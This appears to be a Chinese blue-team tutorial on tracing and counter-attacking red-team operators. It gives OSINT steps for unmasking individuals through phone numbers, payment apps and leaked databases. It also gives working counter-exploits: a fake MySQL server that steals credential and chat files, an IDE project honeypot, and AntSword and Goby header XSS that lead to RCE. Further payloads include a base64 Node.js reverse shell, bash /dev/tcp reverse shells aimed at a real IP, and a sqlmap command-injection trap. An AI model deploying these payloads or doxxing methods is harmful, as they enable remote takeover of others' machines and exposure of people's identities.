# 蓝队技能-溯源反制篇&暴打红队&蜜罐读取&IDE上线&蚁剑RCE&Goby资产&Sqlmap命令

```
IP分析：
1、反查域名
https://www.ipip.net/ip.html
https://www.aizhan.com/
https://www.whois.com/
2、IP信息
https://www.ipip.net/
http://ipwhois.cnnic.net.cn/index.jsp
可获得是否为移动网络、IDC等IP段所属公司
3、IP定位
https://www.chaipip.com/index.html
https://www.opengps.cn/Data/IP/ipplus.aspx

域名查询&恶意样本：
1、可利用网站：
https://x.threatbook.cn/
https://ti.qianxin.com/
https://ti.360.net/
https://www.venuseye.com.cn/
2、根据域名进行溯源
whois查询
备案查询
企查查/天眼查查询
zoomeye/fofa查询
3、样本特征字符密码等
分析：在线沙箱威胁感知平台
逆向：如后门密码，源码注释，反编译特殊字符串等

ID追踪：
(1) 百度信息收集："id" （双引号为英文）
(2) 谷歌信息收集
(3) src信息收集（各大src排行榜）
(4) 微博搜索（如果发现有微博记录，可使用tg查询weibo泄露数据）
(5) 微信ID收集：微信进行ID搜索（直接发钉钉群一起查）
(6) 如果获得手机号（可直接搜索支付宝、社交账户等）
注：获取手机号如信息不多，直接上报钉钉群（利用共享渠道对其进行二次工作）
(7) 豆瓣/贴吧/知乎/脉脉 你能知道的所有社交平台，进行信息收集
(8) 其他补充
在github，gitee，开源中国中查找
在社交平台上查找，（微信/微博/linkedin/twitter）
技术博客（csdn，博客园），src平台（补天）
在安全群/安全圈子里询问。

社交帐号：
1、reg007
2、各种库子查询
https://github.com/gggduck/skg_rank

手机号码：
1、支付宝转账 - > 确定姓名，甚至获取照片
2、微信搜索 ->  微信ID可能是攻击者的ID，甚至照片
4、社交平台查找（抖音、脉脉、钉钉搜索等

资源导航：
https://dh.aabyss.cn/
https://www.hackjie.com/
https://www.shentoushi.top/
https://index.tesla-space.com/


攻击画像大概模型：
姓名/ID：
攻击IP：
地理位置：
QQ:
IP地址所属公司：
IP地址关联域名：
邮箱：
手机号：
微信/微博/src/id证明：
人物照片：
跳板机（可选）：
关联攻击事件：

#日志提取-IP溯源-攻击画像
xiaodi8日志分析
#后门文件-域名溯源-攻击画像
C2后门文件分析
#恶意样本-ID溯源-攻击画像
https://mp.weixin.qq.com/s/cPGl2clC1OsvKWkd0m4qgQ

```

```
#溯源反制-蜜罐-伪装MYSQL
当红队小子对目标进行扫描时，发下存在MYSQL安全问题去利用，便会落入蓝队的陷阱
https://github.com/ev0A/Mysqlist
蓝队：
1、修改读取文件字典
如：
-CS配置文件
C:/Users/Administrator/.aggressor.prop
-微信号配置文件
E:/WeChatFiles/WeChat Files/All Users/config/config.data
-浏览器历史记录
C:/Users/Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Login Data
2、交互式或字典式启动（python2版本运行）
c:\Python27\python.exe exp_dicc.py 3306
c:\Python27\python.exe exp_input.py 3306

红队：
采用MYSQL客户端连接后触发


#溯源反制-蜜罐-伪装源码泄漏
当红队小子对网站进行目录扫描时，发现一个源码包，恰好又会点代审，便会落入蓝队的陷阱前端页面推荐使用登录框，使得红队束手被迫目录扫描，zip包名称推荐source.zip[域名].zip等
https://github.com/wendell1224/ide-honeypot
蓝队：
1、制作蜜罐源代码及配置启动程序workspace.xml
源代码：存放一些正常的源代码程序文件
配置启动：https://github.com/no-one-sec/idea-project-fish-exploit
2、将网站选择性编辑迷惑
· view 目录下放index.html模板文件
· js/css/fonts/img 等目录则是放静态资源
· favicon.ico放在与main.go同级目录（也可以不需要）
· source目录则是jb小子要打开的目录，src下可以放一下没用的源码增加zip包体积诱惑攻击队
3、启动项目等待红队上钩
ide-honeypot.exe -h 0.0.0.0 -p 8080 -f www -c "calc"

红队：
开始扫描，找到源码，开始审计，GG


#溯源反制-Webshell工具-AntSword
蓝队通过修改被植入后门的代码实现获得蚁剑使用者的权限
复现环境：<= v2.0.7 版本蚁剑反制
蓝队：Linux Web
红队：Windows AntSword
原理：
<?php
header('HTTP/1.1 500 <img src=# onerror=alert(1)>');
上线：
Nodejs代码：
var net = require("net"), sh = require("child_process").exec("cmd.exe");
var client = new net.Socket();
client.connect(xx, "xx.xx.xx.xx", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});
编码组合后：
header("HTTP/1.1 500 Not <img src=# onerror='eval(new Buffer(`dmFyIG5ldCA9IHJlcXVpcmUoIm5ldCIpLCBzaCA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjKCJjbWQuZXhlIik7CnZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwpjbGllbnQuY29ubmVjdCgxMDA4NiwgIjQ3Ljk0LjIzNi4xMTciLCBmdW5jdGlvbigpe2NsaWVudC5waXBlKHNoLnN0ZGluKTtzaC5zdGRvdXQucGlwZShjbGllbnQpO3NoLnN0ZGVyci5waXBlKGNsaWVudCk7fSk7`,`base64`).toString())'>");

#溯源反制-SQL注入工具-SQLMAP
蓝队提前构造注入页面诱使红队进行SqlMap注入拿到红队机器权限
复现环境：
蓝队：Linux Web
红队：Linux sqlmap
原理：
命令管道符：ping "`dir`"
构造注入点页面固定注入参数值，等待攻击者进行注入
sqlmap -u "http://47.94.236.117/test.html?id=aaa&b=`dir`"
sqlmap -u "http://47.94.236.117/test.html?id=aaa&b=`exec /bin/sh 0</dev/tcp/47.94.236.117/2333 1>&0 2>&0`"

1、测试反弹编码：
bash -i >& /dev/tcp/47.94.236.117/2333 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzIzMzMgMD4mMQ==
echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzIzMzMgMD4mMQ== | base64 -d|bash -i
2、蓝队构造页面test.php注入页面固定参数值：
<html>
<head>
    <meta charset="utf-8">  
    <title> A sqlmap honeypot demo</title>
</head>
<body>
	<input>search the user</input>   <!--创建一个空白表单-->
	<form action="username.html" method="post" enctype="text/plain">
		<!--创建一个隐藏的表单-->
		<input type='hidden' name='name' value="xiaodi&id=45273434&query=shell`echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzIzMzMgMD4mMQ== | base64 -d|bash -i`&port=6379"/>	
		<!--创建一个按钮，提交表单内容-->
		<input type="submit" value='提交'>
 
	</form>
</body>
</html>
3、红队攻击者进行注入测试：
sqlmap -u "http://xx.xx.xx.xx/test.php" --data "name=xiaodi&id=45273434&query=shell`echo YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC4yMzYuMTE3LzIzMzMgMD4mMQ== | base64 -d|bash -i`&port=6379"

#溯源反制-漏洞扫描工具-Goby
蓝队在红队攻击目标端口上写一个文件，
红队利用goby去扫描分析时会触发反制得到机器权限
复现环境：
蓝队：Linux Web
红队：Windows10 Goby
RCE:
index.php
<?php
header("X-Powered-By: PHP/<img	src=1	onerror=import(unescape('http%3A//47.94.236.117/1.js'))>");
?>
<head>
<title>TEST</title>
</head>
<body>
testtest
</body>
</html>
1.js
(function(){
require('child_process').exec('calc.exe');
})();
2.js上线：
(function(){
require('child_process').exec('powershell -nop -w hidden -encodedcommand JABXXXXXXXX......');
})();

```

